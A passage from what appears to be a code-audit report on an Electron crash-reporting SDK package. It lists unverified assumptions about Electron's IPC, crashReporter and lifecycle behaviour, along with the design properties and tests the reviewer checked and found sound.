1. **`contextBridge` semantics** — whether the exposed `__bugseeElectron` is writable/configurable by page script, and how contextBridge proxies the `onControl` callback across worlds. The fake is a plain `exposeInMainWorld: vi.fn()` (`preload-bridge.test.ts:16-20`).
2. **`crashReporter.start()` called twice** — whether real Electron throws, silently re-configures, or ignores the second call. This decides whether SEV1 #5 manifests as a startup crash or a silent hijack.
3. **`crashReporter.getCrashesDirectory()`** — the actual returned path and its per-app/per-instance scoping (the harvest logic depends on it being app-global, which only a code comment asserts).
4. **Crashpad's real `completed/` semantics across win/mac/linux** — pending vs completed, rename atomicity, whether `uploadToServer:false` leaves dumps readable (the design's own OQ-5, `docs/design/electron-native-crashes.md:209`). No real `.dmp` fixture exists anywhere in the repo.
5. **Whether a throw inside an `ipcMain` listener crashes the main process** or is absorbed by Electron's dispatcher (SEV2 #6's severity depends on this).
6. **`webContents.send` to a destroyed/crashed renderer** — assumed to throw and be swallowed (`main-control.ts:56-62`); real behaviour (throw vs no-op vs async failure) unverified.
7. **`ipcRenderer.send` failure modes** — oversized payloads, non-cloneable arguments, sends during frame teardown (SEV2 #13).
8. **App lifecycle** — `before-quit`/`will-quit`/`window-all-closed` interaction with the node tier's ref'd ANR-watchdog `MessagePort` and its `'exit'`-bound flush. In Electron the main process's lifetime is governed by Chromium's message loop and an explicit `app.quit()`, not by the Node event loop draining, so the node-tier "pinned process" defect most likely does **not** prevent quit here — but I could not verify that, and I could not verify whether `process.on('exit')` fires on an Electron quit (if it does not, the node tier's flush-on-exit never runs in Electron at all, which would be a separate data-loss finding).
9. **Renderer reality** — the browser client inside a Chromium renderer: IndexedDB coexistence per renderer, replay under `contextIsolation`, `sandbox: true` renderers, and whether `launchRenderer` even survives a sandboxed renderer's restricted globals. The e2e fakes `@bugsee/browser` entirely (`electron-e2e.test.ts:147-153`).
10. **Utility processes / `<webview>` / `BrowserView`** — never modelled; `utilityProcess` children are not covered by any of the wiring.

---

## Checked and found clean

- **No `electron` dependency, no `electron` import.** `package.json` lists only `@bugsee/browser`, `@bugsee/core`, `@bugsee/node`, `@bugsee/protocol`; `grep` for `from 'electron'` / `require('electron')` in non-test sources matches **comments only** (`launch-main.ts:4,7,40`, `preload.ts:4`, `preload-bridge.ts:4,52`). `ipcMain`, `contextBridge`, `ipcRenderer`, `crashReporter`, `webContents` and `MediaRecorder` are all structural injected args.
- **Entry-point separation is correct.** `./main` (`main.ts`) pulls only `@bugsee/node` + node-only modules; `./renderer` (`renderer.ts`) pulls only `@bugsee/browser` + portable modules; `./preload` (`preload.ts`) pulls only `preload-bridge.ts`, which imports nothing; `.` (`index.ts`) exports only the wire codec. Traced every transitive import: `node:fs`/`node:path` appear **only** in `native-crash-source.ts`, which is reachable solely from `./main`. No DOM type is *imported* — `MediaRecorderLike` is a hand-written structural subset (`video-capture.ts:98-102`).
- **Delete-before-confirm ordering in native-crash recovery** — dumps are claimed only after confirmed delivery (see the audit above). Correct.
- **The control channel is one-directional** — renderers cannot issue pause/resume/flush/stop; main listens only for `entry` and `hello`.
- **`decodeControl` validates the command against an allowlist** (`protocol.ts:76-82,116-118`) — a renderer cannot invent control kinds even on the main→renderer path.
- **Best-effort broadcast** — a throwing/destroyed `webContents` cannot break delivery to its siblings (`main-control.ts:56-62`), and a `hello` with no sender is ignored (`:76-79`).
- **`client.stop` wrapping is defensive** — Electron cleanup runs inside try/catch and the real node `stop(timeout)` always executes and its true result is returned (`launch-main.ts:122-133`), asserted at `launch-main.test.ts:249-265`.
- **Repeat-launch safety** — all Electron wiring hangs off first-launch `internals`; a second `launchMain` returns the client untouched with no second receiver, control manager, crashReporter start, or `stop` re-wrap (`launch-main.ts:88-94`; `launch-main.test.ts:206-212,276-284`).
- **Pixel-video controller robustness** — `start`/`stop`/`snapshot` all route failures to `onError` and never reject or block a report; `start` is idempotent and rolls back `active` on failure (`pixel-video-controller.ts:36-77`).
- **`encodeStreamEntry`'s payload splice is sound** — `head.slice(0,-1)` + `,"p":<payload>` cannot corrupt the envelope because the head is a `JSON.stringify` product (`protocol.ts:24-36`); the round trip is asserted in `protocol.test.ts`.
- **Default data root hardening** — `os.tmpdir()/bugsee/<appTokenHash>` is ownership/mode-verified before use and degrades to memory if foreign, so the shared-`/tmp` cross-user case is covered (`packages/node/src/data-location.ts:15-33` and the `ensureSecureDataRoot` path).
- **`createNodeCrashDumpFs` is exercised against a real filesystem**, not only the in-memory fake (`native-crash-source.test.ts:106-121`) — a genuine round trip including `unlink`.
- **The merged-bundle e2e is real where it claims to be** — real `@bugsee/node` launch, real streaming store, real zip assembly, asserting main + renderer-1 + renderer-2 entries in one `logs.json` plus the opt-in `video.webm` (`electron-e2e.test.ts:172-248`).
- **Repo hygiene:** `pnpm --filter @bugsee/electron exec vitest run` → 16 files / 115 tests green; `git -C … status --short packages/` is **empty** after all mutation experiments (every file restored from a `cp` backup, no `git checkout` used); all filesystem experiments were confined to the session scratchpad.
